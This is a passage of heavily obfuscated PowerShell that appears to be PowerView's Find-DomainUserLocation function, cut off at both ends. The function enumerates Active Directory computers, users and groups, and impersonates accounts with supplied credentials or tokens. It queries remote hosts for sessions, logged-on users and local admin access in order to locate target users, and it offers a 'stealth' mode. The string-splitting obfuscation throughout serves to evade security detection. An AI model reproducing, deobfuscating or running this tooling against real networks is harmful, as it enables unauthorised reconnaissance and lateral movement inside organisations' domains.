        [Switch]
        ${STe`ALth},

        [String]
        [ValidateSet('DFS', 'DC', {"{0}{1}"-f 'F','ile'}, 'All')]
        ${SteAlT`Hs`oUr`cE} = 'All',

        [Int]
        [ValidateRange(1, 100)]
        ${THREa`dS} = 20
    )

    BEGIN {

        ${cOM`PUTeR`sEaRCHe`R`Arg`Um`EnTS} = @{
            ("{2}{0}{1}"-f 'ro','perties','P') = ("{2}{1}{3}{0}"-f'e','s','dnsho','tnam')
        }
        if (${pS`BO`UNdpar`Am`ETErs}[("{0}{1}{2}"-f 'D','om','ain')]) { ${CoM`PutEr`SEarc`h`e`RAr`GUme`NTs}[("{0}{1}"-f'Do','main')] = ${dO`mA`In} }
        if (${psboU`N`Dparam`eTeRs}[("{4}{1}{3}{0}{2}" -f'erDoma','o','in','mput','C')]) { ${COmpute`RsEarCH`Er`ARguME`Nts}[("{0}{1}"-f'Domai','n')] = ${cOM`pu`TeRD`o`MaiN} }
        if (${PSb`oU`N`dPA`RAmEteRS}[("{3}{0}{1}{2}"-f 'om','pu','terLDAPFilter','C')]) { ${COm`p`U`TE`RSEar`cHerArGuM`eNtS}[("{1}{2}{0}"-f'ter','LDA','PFil')] = ${Com`pUTe`RlD`A`PfIlTer} }
        if (${P`SBo`UNDpa`RaMEteRS}[("{4}{3}{1}{0}{2}"-f 'rchBas','terSea','e','u','Comp')]) { ${CO`mpU`TER`SeArChEr`ARguMENts}[("{2}{3}{0}{1}"-f 'chBa','se','Sea','r')] = ${com`PUTe`RSEar`CHBAse} }
        if (${Psb`oUNdpa`RA`mEt`ERs}[("{1}{2}{0}{3}" -f 'ine','Unconst','ra','d')]) { ${cO`mpUT`eR`S`EArche`RA`RGUmeNtS}[("{0}{2}{1}"-f 'Un','ained','constr')] = ${un`CONstrai`Ned} }
        if (${Psbou`N`DPArAmE`Te`RS}[("{4}{0}{1}{2}{3}"-f'uterOperat','in','gSy','stem','Comp')]) { ${cOMP`UTe`RsE`A`RChEr`A`RGUM`EnTs}[("{2}{1}{0}{3}" -f 'tingS','a','Oper','ystem')] = ${Op`erAt`inG`s`YSTEm} }
        if (${psb`oUnDpArAm`Ete`Rs}[("{0}{2}{5}{1}{3}{4}"-f 'Co','ice','mputerSe','Pa','ck','rv')]) { ${Co`MP`UteRSea`Rch`eR`ARgU`ME`NtS}[("{2}{1}{0}" -f'ack','ceP','Servi')] = ${s`eR`VIcE`paCK} }
        if (${pS`BounDP`A`RAMETE`Rs}[("{3}{1}{5}{4}{0}{2}"-f 'it','e','eName','Comput','S','r')]) { ${cOmp`UtErS`e`A`RCHE`RaRG`UMENtS}[("{0}{2}{1}" -f 'S','teName','i')] = ${s`ITE`NAmE} }
        if (${PsB`o`U`NDPar`AMETeRs}[("{0}{1}{2}" -f 'Se','rve','r')]) { ${COmP`UteRs`E`Ar`cH`ERAR`Gu`ME`NtS}[("{0}{1}"-f'Serve','r')] = ${SeR`VeR} }
        if (${P`sBO`UNDP`AR`AMEtERs}[("{1}{2}{0}" -f'rchScope','S','ea')]) { ${C`O`mp`UTErsE`ArC`HerArgume`NtS}[("{1}{0}{2}" -f 'rch','Sea','Scope')] = ${sE`Arch`Sc`OpE} }
        if (${Ps`B`OUN`dpaRA`mEteRs}[("{3}{0}{2}{1}" -f'tPa','ize','geS','Resul')]) { ${co`mPUTerSeARc`heraR`GUMe`NTS}[("{2}{3}{0}{4}{1}"-f 'e','ize','ResultP','ag','S')] = ${rEsU`Ltp`AGE`SizE} }
        if (${P`SBoUNdp`ARamET`E`RS}[("{2}{0}{4}{3}{1}" -f 'i','Limit','ServerT','e','m')]) { ${c`OmpUT`ERsEARc`H`ErArgu`meNts}[("{3}{4}{1}{2}{0}"-f't','meL','imi','Server','Ti')] = ${se`RVE`Rt`imeLi`MiT} }
        if (${pSB`OUN`d`pa`RaMetE`Rs}[("{1}{2}{0}" -f'e','Tom','bston')]) { ${co`MPute`R`se`Ar`ch`E`Ra`RGUmEnts}[("{2}{0}{1}"-f'ombston','e','T')] = ${T`OmbSt`o`Ne} }
        if (${p`sBOU`Ndparamete`Rs}[("{1}{0}{2}"-f 'redenti','C','al')]) { ${Co`MpUTerS`ea`RcHE`RaRguments}[("{2}{3}{1}{0}" -f 'al','i','Cred','ent')] = ${cR`eD`EntiaL} }

        ${usERsEArc`H`ErA`RGumE`Nts} = @{
            ("{2}{3}{1}{0}"-f 'ies','pert','Pr','o') = ("{0}{2}{4}{3}{1}"-f 'samac','e','c','m','ountna')
        }
        if (${psB`ou`NDpa`RA`M`eTers}[("{1}{0}{2}" -f'serIden','U','tity')]) { ${USeR`S`Ea`R`Che`RaR`GumEnTS}[("{0}{1}{2}"-f'Id','entit','y')] = ${User`idE`NTIty} }
        if (${PsBo`UNdPaRA`Me`Te`Rs}[("{0}{1}"-f 'Do','main')]) { ${UsEr`seArC`HERAR`G`Um`EntS}[("{0}{1}{2}"-f 'D','o','main')] = ${d`O`maiN} }
        if (${PsBo`Und`Pa`RAMEteRs}[("{3}{2}{1}{0}"-f'n','i','serDoma','U')]) { ${Use`Rs`EARC`HEr`ArGUMENts}[("{0}{1}{2}" -f 'Do','m','ain')] = ${u`s`ErdOma`In} }
        if (${PsBOu`NDP`ARaMETE`Rs}[("{4}{2}{0}{3}{1}" -f 'AP','ter','D','Fil','UserL')]) { ${USErs`e`ARcH`ERaRGUMEn`TS}[("{0}{1}{2}"-f 'L','DAPFilte','r')] = ${uSer`LDa`pf`IltER} }
        if (${PSbo`U`NDpar`AMe`TeRs}[("{0}{1}{2}"-f 'UserSe','arch','Base')]) { ${U`SE`R`seaRcHe`RaRgUMeNTS}[("{1}{2}{0}"-f'chBase','Sea','r')] = ${USEr`sEA`RChB`AsE} }
        if (${P`sBOundPaRaM`Et`e`Rs}[("{0}{2}{1}" -f 'User','nt','AdminCou')]) { ${U`sEr`seARcH`eRaRGume`Nts}[("{2}{3}{1}{0}" -f'nt','u','Ad','minCo')] = ${uSER`ADminC`OUnT} }
        if (${P`SbOU`N`DpaRAmeTers}[("{2}{0}{3}{1}{4}" -f'serA','a','U','llowDeleg','tion')]) { ${usErSe`A`RcH`ERArG`UmeNtS}[("{3}{2}{0}{1}" -f 'owDele','gation','ll','A')] = ${uS`E`RAl`loWd`E`leG`ATioN} }
        if (${PS`BOuNdPa`R`AM`ETers}[("{2}{1}{0}"-f 'rver','e','S')]) { ${uSersE`Ar`CheraRgU`m`EN`Ts}[("{0}{1}" -f'Se','rver')] = ${S`Er`Ver} }
        if (${P`sboUNDp`A`Rame`TE`Rs}[("{3}{0}{1}{2}" -f 'rchS','cop','e','Sea')]) { ${uSers`earchERarGU`m`eN`TS}[("{0}{3}{1}{2}" -f'Sea','cop','e','rchS')] = ${SEA`Rc`hScOPe} }
        if (${pSB`O`UnDpar`Ame`T`ErS}[("{3}{2}{1}{0}{4}" -f'Siz','ultPage','es','R','e')]) { ${U`SErSE`ArcHerar`G`UMeNtS}[("{1}{0}{3}{2}"-f 'esul','R','PageSize','t')] = ${rEsul`TPAG`E`SIze} }
        if (${pS`B`o`UNdpa`RaMetErs}[("{3}{0}{2}{1}"-f'ver','Limit','Time','Ser')]) { ${usERs`Ear`CHE`R`ArgU`MeNtS}[("{0}{3}{2}{1}"-f'Se','mit','meLi','rverTi')] = ${ser`V`ERT`iMELIMiT} }
        if (${Psbo`UndpAr`AM`eTeRs}[("{0}{1}" -f'To','mbstone')]) { ${uSeRSear`ChERaRGu`M`E`NTS}[("{0}{1}{2}" -f'Tombsto','n','e')] = ${toMBS`To`Ne} }
        if (${ps`BoUn`dPaRAMe`TErS}[("{0}{1}{2}" -f'Cr','edentia','l')]) { ${uSERSe`A`RchERa`R`Gu`m`entS}[("{2}{0}{1}{3}" -f'nt','ia','Crede','l')] = ${C`R`edenT`iAL} }

        ${Targ`etComPut`e`RS} = @()

        
        if (${PSBOun`dparaMeT`e`RS}[("{2}{0}{1}" -f'uter','Name','Comp')]) {
            ${tarG`et`c`OMp`UTerS} = @(${CO`MPU`TE`R`NAmE})
        }
        else {
            if (${psBOuN`dp`Ar`AmETErS}[("{1}{0}{2}" -f't','S','ealth')]) {
                &("{1}{4}{3}{2}{0}"-f'e','Wri','os','-Verb','te') ('[Fin'+'d'+'-Domai'+'nUs'+'er'+'Location'+'] '+'S'+'tealt'+'h '+'en'+'u'+'merati'+'on '+'us'+'i'+'ng '+'sour'+'c'+'e: '+"$StealthSource")
                ${taRGEtc`O`MputErA`RrAY`L`I`St} = &("{1}{2}{0}" -f 't','New-Obj','ec') ("{2}{0}{3}{5}{6}{1}{4}" -f'stem.','s.ArrayL','Sy','Col','ist','lectio','n')

                if (${ste`AL`THsOUrCE} -match ((("{0}{1}{2}"-f 'File{','0}A','ll')) -f[cHaR]124)) {
                    &("{2}{0}{3}{1}{4}" -f '-','b','Write','Ver','ose') ("{10}{1}{7}{9}{2}{5}{13}{11}{4}{3}{6}{12}{8}{0}"-f 'file servers','n','in',' ','ion]','Us','Qu','d-Do','for ','ma','[Fi','at','erying ','erLoc')
                    ${F`iLESe`R`Ver`seAr`cH`erA`RGuMen`TS} = @{}
                    if (${ps`Boun`DPARa`METE`Rs}[("{1}{0}"-f 'in','Doma')]) { ${fILE`sERV`erSEA`RCHe`R`Argu`mE`NTS}[("{0}{1}{2}" -f 'Do','m','ain')] = ${dOM`AIN} }
                    if (${PsBOUndP`A`Rame`TerS}[("{1}{3}{2}{0}"-f 'main','Com','uterDo','p')]) { ${FILe`seRVeRSear`CheRArG`UM`enTS}[("{1}{2}{0}" -f'main','D','o')] = ${coMP`UtER`D`O`mAin} }
                    if (${PSbOu`N`DpA`RamE`TErs}[("{1}{2}{3}{0}"-f'chBase','C','omputer','Sear')]) { ${fiL`ES`erVErsEaRcHER`ARgumE`NTs}[("{2}{1}{0}"-f'e','archBas','Se')] = ${COM`pUter`Se`A`RChb`ASE} }
                    if (${PS`B`OUNd`par`AmETerS}[("{1}{0}"-f 'rver','Se')]) { ${fI`leSErVERSea`RCH`ER`A`RguME`NTS}[("{0}{1}"-f 'Serve','r')] = ${serv`Er} }
                    if (${P`SBo`U`N`DPAR`AmeTeRs}[("{0}{1}{2}" -f 'S','ea','rchScope')]) { ${fI`l`es`erversEaR`CHe`RArGumEnTS}[("{2}{0}{1}" -f 'cop','e','SearchS')] = ${Sear`ch`sCO`PE} }
                    if (${P`sBouNd`pA`R`AMetErS}[("{2}{0}{3}{4}{1}" -f'es','eSize','R','ultP','ag')]) { ${FIlESE`RV`e`RSe`A`R`c`he`RARgUMEnts}[("{1}{4}{2}{0}{3}"-f'eSiz','Res','Pag','e','ult')] = ${rE`SULTP`A`G`ESIze} }
                    if (${ps`BOuNDPar`Ame`T`eRs}[("{3}{0}{2}{1}" -f'er','imeLimit','T','Serv')]) { ${files`erVerSEa`Rc`H`erargUmeNTs}[("{0}{2}{3}{1}" -f 'S','eLimit','erver','Tim')] = ${SE`RvE`Rt`i`MElImiT} }
                    if (${P`SbO`Und`P`ARAMeTeRs}[("{1}{0}{2}" -f'n','Tombsto','e')]) { ${FIlE`serVER`sE`ARCHeRa`Rg`UmE`NTs}[("{0}{1}{2}" -f'T','om','bstone')] = ${T`OMBs`TONe} }
                    if (${PS`B`OuNdPa`R`AmETERs}[("{0}{2}{1}" -f 'Credenti','l','a')]) { ${fil`ES`e`Rve`RSE`Ar`CheRarG`U`mENtS}[("{0}{2}{1}{3}" -f 'Creden','ia','t','l')] = ${crEDe`Nt`Ial} }
                    ${fILes`ER`VErS} = &("{4}{2}{0}{1}{3}" -f 'Dom','ai','et-','nFileServer','G') @FileServerSearcherArguments
                    if (${fIL`Ese`Rve`RS} -isnot [System.Array]) { ${fil`EservE`Rs} = @(${F`Ileserv`e`Rs}) }
                    ${t`ARgeTCOm`pUtERAR`Ra`Y`lIST}.("{0}{1}" -f'AddR','ange').Invoke( ${FiL`esE`RVeRs} )
                }
                if (${s`Te`ALTHsO`UrCE} -match ((("{0}{1}{3}{2}" -f 'D','F','All','SUAO'))."R`E`PLAce"('UAO',[StrINg][cHar]124))) {
                    &("{1}{0}{3}{2}" -f'it','Wr','erbose','e-V') ("{4}{7}{0}{2}{1}{5}{8}{3}{6}"-f' Queryi','g for ','n','S','[Find-DomainUserLoca','D',' servers','tion]','F')
                    
                    
                }
                if (${S`T`EAl`TH`SOURce} -match ((("{1}{0}"-f'll','DC{0}A')) -f[cHAr]124)) {
                    &("{2}{0}{1}"-f'te-Verb','ose','Wri') ("{0}{2}{6}{4}{9}{5}{11}{8}{10}{14}{1}{3}{12}{7}{13}" -f'[Find-','erying ','Doma','for ','n','c','i','in contro','ti','UserLo','on]','a','doma','llers',' Qu')
                    ${DC`s`EaRcH`E`RA`R`guMEntS} = @{
                        ("{1}{0}" -f'DAP','L') = ${t`RUE}
                    }
                    if (${p`s`Boun`DPARAmeTERS}[("{1}{2}{0}" -f 'main','D','o')]) { ${DCs`e`ARCHErA`Rg`Uments}[("{1}{0}{2}"-f'ma','Do','in')] = ${DoMa`in} }
                    if (${psBOUnDpaRAm`e`T`ERs}[("{1}{0}{3}{2}"-f'puterDo','Com','n','mai')]) { ${d`cseARcherARg`UME`N`TS}[("{1}{0}{2}" -f'ma','Do','in')] = ${c`oMPUTe`RDoM`AIN} }
                    if (${p`sBOundPAR`AM`et`ErS}[("{0}{1}" -f 'Ser','ver')]) { ${D`cSEarcherarGuM`e`Nts}[("{1}{0}"-f 'rver','Se')] = ${SE`R`Ver} }
                    if (${pS`BouN`dPar`AmEt`Ers}[("{0}{2}{1}"-f 'Cred','ial','ent')]) { ${DCsEA`RCHeraRg`U`MeN`Ts}[("{2}{0}{1}"-f'e','dential','Cr')] = ${C`Rede`NTI`Al} }
                    ${D`OmaINc`ontr`o`LLeRs} = &("{0}{2}{5}{1}{3}{4}" -f'Ge','tr','t-Domain','oll','er','Con') @DCSearcherArguments | &("{0}{3}{1}{2}" -f 'Se','e','ct-Object','l') -ExpandProperty ("{1}{2}{3}{0}"-f 'ame','dn','sh','ostn')
                    if (${D`OMAIn`cONTROlle`RS} -isnot [System.Array]) { ${d`o`mA`inCOnTroLlE`RS} = @(${d`OMA`i`NConT`ROlLeRs}) }
                    ${t`A`RgEtcoMput`E`R`ARR`AY`lIst}.("{1}{0}{2}" -f 'a','AddR','nge').Invoke( ${DOM`AinCO`NT`R`OlLers} )
                }
                ${tarGE`T`ComPUt`ERS} = ${t`ArGE`T`Comp`UterArr`AYList}.("{1}{0}"-f 'ray','ToAr').Invoke()
            }
            else {
                &("{1}{2}{0}{3}"-f'o','Writ','e-Verb','se') ("{2}{7}{1}{3}{12}{6}{10}{4}{13}{11}{8}{9}{5}{0}" -f'n the domain','DomainUserL','[F','ocation] Qu','for al','ers i','ry','ind-','mp','ut','ing ','o','e','l c')
                ${taRGET`c`ompUtERs} = &("{1}{2}{3}{0}{4}"-f'nCompute','Get-D','o','mai','r') @ComputerSearcherArguments | &("{3}{4}{0}{1}{2}" -f'c','t-Obje','ct','S','ele') -ExpandProperty ("{3}{2}{0}{1}"-f 'tn','ame','nshos','d')
            }
        }
        &("{1}{3}{0}{2}" -f 'Ver','Wri','bose','te-') "[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length) "
        if (${ta`Rg`ETC`OmPUt`E`Rs}."LE`N`gTH" -eq 0) {
            throw ("{0}{5}{3}{8}{1}{2}{9}{11}{10}{12}{4}{6}{7}" -f '[Fi','L','ocati','ainUs',' ','nd-Dom','enum','erate','er','on] No host','found t','s ','o')
        }

        
        if (${Ps`Bo`UndpAR`A`METERs}[("{1}{0}{2}" -f 'ia','Credent','l')]) {
            ${C`URrE`NtuS`Er} = ${cREDEn`T`iaL}.("{3}{1}{0}{2}{4}" -f 'tworkCred','e','en','GetN','tial').Invoke()."US`ERNaME"
        }
        else {
            ${cuRRE`NT`U`ser} = ( (&("{0}{1}{2}" -f 'v','a','RIABLE') ("0yD"+"5Sb"))."v`AlUE"::"U`SER`Name").("{2}{0}{1}" -f'e','r','ToLow').Invoke()
        }

        
        if (${ps`Bou`NdParAme`T`E`Rs}[("{0}{2}{1}"-f 'Show','ll','A')]) {
            ${Ta`RGETUs`E`RS} = @()
        }
        elseif (${psbO`UnD`pA`RAmEtE`RS}[("{2}{0}{1}{3}"-f's','erIde','U','ntity')] -or ${ps`BOUn`dp`A`R`AMeTERs}[("{4}{0}{3}{1}{2}"-f'L','F','ilter','DAP','User')] -or ${P`s`BOuN`DpaRame`TERS}[("{3}{0}{2}{1}"-f 'ser','Base','Search','U')] -or ${ps`BO`UNd`p`AramEtErs}[("{2}{1}{0}" -f'unt','inCo','UserAdm')] -or ${p`sBouNDPar`AMe`T`E`RS}[("{2}{5}{0}{1}{4}{3}"-f 'llow','Del','Use','ation','eg','rA')]) {
            ${tA`RgetUs`ers} = &("{0}{3}{2}{1}"-f 'Get-D','nUser','mai','o') @UserSearcherArguments | &("{1}{3}{2}{0}"-f 'ct','Select','je','-Ob') -ExpandProperty ("{0}{1}{3}{2}" -f's','amacco','me','untna')
        }
        else {
            ${gRoUp`SEar`c`HEra`RgumenTs} = @{
                ("{1}{2}{0}" -f'y','I','dentit') = ${US`ErGroUp`idEn`TiTy}
                ("{0}{1}{2}" -f'Re','c','urse') = ${T`RuE}
            }
            if (${p`SbO`U`NDpar`AMEtErS}[("{1}{2}{0}" -f 'ain','Us','erDom')]) { ${G`Ro`U`P`seArch`eR`ArgUmEnTs}[("{1}{0}" -f'omain','D')] = ${USeR`DO`Ma`in} }
            if (${PsBoU`NDPArAM`E`TE`Rs}[("{3}{1}{0}{2}" -f 'hB','erSearc','ase','Us')]) { ${grOu`pS`eaR`chERaRgUmenTS}[("{2}{1}{0}" -f'e','archBas','Se')] = ${USErse`A`R`chbasE} }
            if (${pS`B`O`UNdPar`AmeterS}[("{1}{0}{2}" -f'e','S','rver')]) { ${GrOuPSEA`Rc`her`ARG`UmENtS}[("{0}{1}{2}" -f 'S','erv','er')] = ${SE`RV`Er} }
            if (${PSBouN`DP`ARAm`ET`E`RS}[("{1}{2}{0}"-f 'ope','Searc','hSc')]) { ${GR`OU`P`SEa`RCHe`RArgu`MEn`Ts}[("{2}{1}{0}"-f'cope','S','Search')] = ${s`E`ArcHsCo`pE} }
            if (${psBo`UNdPaRa`mET`E`RS}[("{1}{2}{0}{3}" -f'g','Resu','ltPa','eSize')]) { ${GRO`U`PsEa`RcHe`R`ARGuM`e`NtS}[("{1}{4}{2}{0}{3}"-f'geS','Re','tPa','ize','sul')] = ${ReSul`T`PAGEs`IZE} }
            if (${P`SB`Ou`NdpaRamET`e`RS}[("{4}{3}{1}{0}{2}"-f'imeLimi','rT','t','e','Serv')]) { ${GRO`UPseA`RcHerA`R`gum`EN`TS}[("{2}{3}{0}{1}"-f'TimeL','imit','Serve','r')] = ${SERvERT`iMEL`I`mit} }
            if (${P`sbo`UN`DpArAMeteRS}[("{0}{1}{2}" -f 'Tomb','st','one')]) { ${G`Ro`Up`SEarCherARgUMe`N`Ts}[("{1}{2}{0}" -f 'stone','T','omb')] = ${T`Om`BS`ToNE} }
            if (${P`SbOU`N`dpARAmeTErS}[("{1}{0}{2}"-f'dentia','Cre','l')]) { ${GROUPSEARC`herArG`UM`EN`Ts}[("{1}{2}{0}" -f'dential','Cr','e')] = ${crE`dENTi`AL} }
            ${t`ARGE`TuSErS} = &("{5}{1}{0}{3}{2}{4}" -f 'n','mai','upMembe','Gro','r','Get-Do') @GroupSearcherArguments | &("{1}{0}{2}"-f 't-Obj','Selec','ect') -ExpandProperty ("{1}{0}{2}"-f 'm','Me','berName')
        }

        &("{3}{0}{1}{2}" -f'ite-Verb','o','se','Wr') "[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length) "
        if ((-not ${sH`o`wALL}) -and (${t`Arg`EtUS`eRS}."leN`gTH" -eq 0)) {
            throw ("{13}{3}{0}{4}{11}{1}{8}{7}{10}{5}{6}{14}{9}{12}{2}"-f'oma','a','t','nd-D','inUserL','und ','to ','users ','tion] No ','r','fo','oc','ge','[Fi','ta')
        }

        
        ${Ho`stENu`mbL`Ock} = {
            Param(${C`oM`PuTErnAMe}, ${TaRG`E`TUSeRS}, ${cUrR`e`NT`UsEr}, ${sT`eal`TH}, ${TOkeNhA`N`D`LE})

            if (${t`Ok`EN`HANDle}) {
                
                ${nu`Ll} = &("{2}{6}{7}{0}{1}{5}{4}{3}"-f 'mpe','rson','Invok','n','io','at','e','-UserI') -TokenHandle ${toKE`Nh`A`NDLE} -Quiet
            }

            ForEach (${taR`gEtc`OM`pu`TEr} in ${C`OMp`UtErn`A`ME}) {
                ${u`p} = &("{1}{3}{0}{4}{2}"-f'Con','Te','tion','st-','nec') -Count 1 -Quiet -ComputerName ${TA`RgE`TcOMPU`Ter}
                if (${u`p}) {
                    ${S`e`ssiOns} = &("{0}{2}{1}{3}{4}" -f 'Get','et','-N','Se','ssion') -ComputerName ${Targ`eTcoM`PUTEr}
                    ForEach (${sESs`I`oN} in ${sE`ssI`O`Ns}) {
                        ${usERn`AME} = ${S`Ession}."USern`Ame"
                        ${CN`A`me} = ${SESs`i`on}."cNa`Me"

                        if (${C`Na`Me} -and ${C`NAME}.("{0}{2}{1}"-f'Start','With','s').Invoke('\\')) {
                            ${C`Na`mE} = ${cn`AMe}.("{0}{1}{2}" -f 'Tr','imSt','art').Invoke('\')
                        }

                        
                        if ((${UsER`N`A`me}) -and (${U`ser`NaMe}.("{1}{0}" -f'im','Tr').Invoke() -ne '') -and (${uS`eR`Na`me} -notmatch ${C`URr`en`TuSeR}) -and (${U`s`ER`NaMe} -notmatch '\$$')) {

                            if ( (-not ${Ta`Rgetu`SeRs}) -or (${tarGeTus`E`Rs} -contains ${UsERnA`ME})) {
                                ${uSeR`l`oca`TiON} = &("{0}{1}{2}" -f 'New-Ob','j','ect') ("{1}{0}{2}"-f 'Obje','PS','ct')
                                ${u`S`er`lOcATiOn} | &("{2}{0}{1}" -f 'dd','-Member','A') ("{1}{2}{0}"-f 'ty','Notep','roper') ("{0}{1}{2}{3}"-f 'Use','rD','oma','in') ${nu`Ll}
                                ${uSerLOCAt`I`oN} | &("{2}{1}{0}" -f 'ber','m','Add-Me') ("{2}{1}{0}"-f 'eproperty','t','No') ("{1}{2}{0}"-f 'e','U','serNam') ${U`SER`NamE}
                                ${useR`Lo`cA`TION} | &("{2}{1}{0}"-f 'er','b','Add-Mem') ("{2}{3}{1}{0}" -f 'erty','rop','Note','p') ("{2}{1}{0}"-f 'ame','uterN','Comp') ${T`ArGEtc`OMpUT`ER}
                                ${u`SeRlOCat`i`oN} | &("{1}{2}{0}" -f'er','Add-Mem','b') ("{0}{1}{2}"-f 'Notep','rop','erty') ("{2}{1}{0}"-f'om','ionFr','Sess') ${cNA`me}

                                
                                try {
                                    ${CNA`mednsN`Ame} =  ( &("{1}{0}" -f 'et-Item','g')  ("vA"+"riA"+"B"+"Le:H4fp"))."va`LUE"::("{0}{1}{2}{3}" -f 'Ge','tHo','stEnt','ry').Invoke(${cn`AmE}) | &("{3}{0}{1}{2}" -f 'b','j','ect','Select-O') -ExpandProperty ("{2}{1}{0}"-f 'Name','t','Hos')
                                    ${u`s`ERLoCATiON} | &("{3}{1}{0}{2}" -f'be','d-Mem','r','Ad') ("{2}{1}{0}"-f 'perty','tePro','No') ("{3}{0}{1}{2}{4}" -f'io','nFr','omNam','Sess','e') ${CN`AM`EDn`S`NamE}
                                }
                                catch {
                                    ${U`serLoc`ATiOn} | &("{1}{2}{0}"-f 'r','Add-Mem','be') ("{1}{2}{3}{0}"-f 'y','N','ote','Propert') ("{0}{3}{1}{2}"-f 'S','ionFro','mName','ess') ${N`UlL}
                                }

                                
                                if (${cHe`cKAc`C`eSS}) {
                                    ${A`DMiN} = (&("{3}{4}{1}{2}{0}"-f'ss','n','Acce','Test-A','dmi') -ComputerName ${C`NamE})."I`SadM`in"
                                    ${UsE`RLOC`AT`ION} | &("{1}{3}{0}{2}"-f'-Me','A','mber','dd') ("{1}{3}{2}{0}" -f 'y','Not','ert','eprop') ("{2}{1}{0}"-f 'Admin','ocal','L') ${A`dmin}."ISa`D`MIn"
                                }
                                else {
                                    ${us`Er`lO`caTion} | &("{0}{1}{2}"-f 'Add-M','e','mber') ("{1}{2}{0}" -f'rty','No','teprope') ("{1}{0}{2}{3}"-f'a','Loc','lA','dmin') ${Nu`lL}
                                }
                                ${usE`RloCaTi`oN}."Ps`OBjecT"."TYp`en`AMES".("{1}{0}"-f 'ert','Ins').Invoke(0, ("{1}{3}{2}{0}{4}" -f'c','Po','View.UserLo','wer','ation'))
                                ${Us`eRLoC`A`T`iON}
                            }
                        }
                    }
                    if (-not ${s`TEAL`TH}) {
                        
                        ${Lo`GgEdon} = &("{2}{1}{0}" -f 'don','ge','Get-NetLog') -ComputerName ${tArgE`TcoM`pu`T`er}
                        ForEach (${uS`er} in ${lOgGED`On}) {
                            ${u`SER`N`AME} = ${US`ER}."USER`NAME"
                            ${US`eRdO`m`AIN} = ${u`SeR}."Lo`gON`D`omAin"

                            
                            if ((${USer`N`AME}) -and (${uSE`RNA`ME}.("{0}{1}" -f'tri','m').Invoke() -ne '')) {
                                if ( (-not ${TarGE`Tuse`Rs}) -or (${taRg`et`USers} -contains ${Use`R`N`AmE}) -and (${USEr`Na`ME} -notmatch '\$$')) {
                                    ${i`pADDR`e`ss} = @(&("{0}{5}{3}{2}{4}{1}" -f 'Resolv','ess','PAdd','I','r','e-') -ComputerName ${tARG`etc`oMP`U`TER})[0]."Ipad`D`REsS"
                                    ${u`se`RloCat`IOn} = &("{3}{2}{0}{1}"-f 'je','ct','w-Ob','Ne') ("{0}{1}{2}" -f'P','SOb','ject')
                                    ${u`Se`RLocAT`iON} | &("{2}{0}{1}" -f 'dd-','Member','A') ("{2}{3}{0}{1}" -f'proper','ty','N','ote') ("{3}{1}{2}{0}"-f'omain','ser','D','U') ${usE`RD`oMAIN}
                                    ${U`sERlO`Cati`oN} | &("{0}{1}{2}{3}"-f 'Add','-M','e','mber') ("{1}{0}{2}" -f 'teprope','No','rty') ("{0}{1}{2}"-f 'U','serNa','me') ${USER`Na`me}
                                    ${UsEr`l`oc`AtIoN} | &("{3}{0}{1}{2}" -f'-Memb','e','r','Add') ("{3}{2}{0}{1}" -f 'pe','rty','ro','Notep') ("{3}{2}{0}{1}" -f'uterN','ame','mp','Co') ${ta`RGE`TCoM`pU`TEr}
                                    ${uSerl`O`cATiOn} | &("{1}{2}{0}" -f'mber','Add','-Me') ("{0}{3}{2}{1}" -f'N','y','t','oteproper') ("{0}{2}{1}"-f'IP','ress','Add') ${Ip`AdD`RESS}
                                    ${uSer`lo`cAtION} | &("{1}{0}{2}"-f'-M','Add','ember') ("{0}{3}{2}{1}"-f 'N','ty','oper','otepr') ("{1}{2}{0}"-f'onFrom','S','essi') ${NU`Ll}
                                    ${UsERL`ocAtI`oN} | &("{1}{2}{0}"-f 'er','Ad','d-Memb') ("{1}{0}{2}" -f 'tepro','No','perty') ("{2}{3}{4}{1}{0}" -f 'me','nFromNa','Sess','i','o') ${n`ULL}

                                    
                                    if (${C`hECKA`cc`ess}) {
                                        ${A`d`MIn} = &("{2}{1}{3}{0}{4}" -f'dminAcce','st-','Te','A','ss') -ComputerName ${Ta`RGEtC`Ompu`TeR}
                                        ${u`S`ErLo`CAti`ON} | &("{0}{1}{2}" -f 'Add','-M','ember') ("{0}{2}{1}{3}" -f 'Note','e','prop','rty') ("{2}{1}{0}" -f 'Admin','l','Loca') ${a`DmIN}."I`Sad`mIn"
                                    }
                                    else {
                                        ${u`s`erloCAT`IoN} | &("{0}{2}{1}" -f'Add-Mem','er','b') ("{0}{3}{1}{2}" -f 'N','epropert','y','ot') ("{2}{1}{0}"-f 'Admin','cal','Lo') ${Nu`lL}
                                    }
                                    ${u`sEr`L`OC`ATIoN}."psO`BJ`eCT"."t`yPeN`AMES".("{2}{0}{1}"-f 'n','sert','I').Invoke(0, ("{3}{0}{2}{4}{1}"-f 'er','n','View.UserLocati','Pow','o'))
                                    ${us`ERlOCaT`I`on}
                                }
                            }
                        }
                    }
                }
            }

            if (${tO`KenHA`NDle}) {
                &("{4}{0}{3}{1}{2}" -f'ke-Re','tToSel','f','ver','Invo')
            }
        }

        ${L`Ogo`NtOkeN} = ${nu`lL}
        if (${P`SBouNDP`Aram`Et`eRs}[("{2}{1}{0}" -f'ntial','ede','Cr')]) {
            if (${P`SBoUndPA`R`AmeTE`Rs}[("{1}{0}"-f 'ay','Del')] -or ${p`SBO`UndpaRa`Me`TeRS}[("{4}{2}{0}{3}{1}" -f 'p','ccess','o','OnSu','St')]) {
                ${lO`goNtok`En} = &("{3}{0}{4}{1}{2}"-f 'nvoke','User','Impersonation','I','-') -Credential ${CRED`e`Nt`IAl}
            }
            else {
                ${lo`go`Ntoken} = &("{3}{5}{0}{6}{4}{1}{2}"-f 'Us','i','on','Invok','onat','e-','erImpers') -Credential ${cr`E`DeNtiaL} -Quiet
            }
        }
    }

    PROCESS {
        
        if (${pSBoUnDpAra`meT`E`RS}[("{1}{0}" -f 'y','Dela')] -or ${PsBOuNd`pA`RAM`ETerS}[("{0}{2}{1}"-f'S','ccess','topOnSu')]) {

            &("{1}{2}{3}{4}{0}" -f'ose','Write','-V','er','b') "[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count) "
            &("{1}{0}{2}" -f 'rite','W','-Verbose') ('[F'+'i'+'nd'+'-DomainUs'+'erLocat'+'ion]'+' '+'Del'+'ay: '+"$Delay, "+'Jit'+'t'+'er: '+"$Jitter")
            ${co`UN`Ter} = 0
            ${r`ANdnO} = &("{2}{1}{0}" -f't','jec','New-Ob') ("{3}{0}{1}{2}"-f'Rand','o','m','System.')

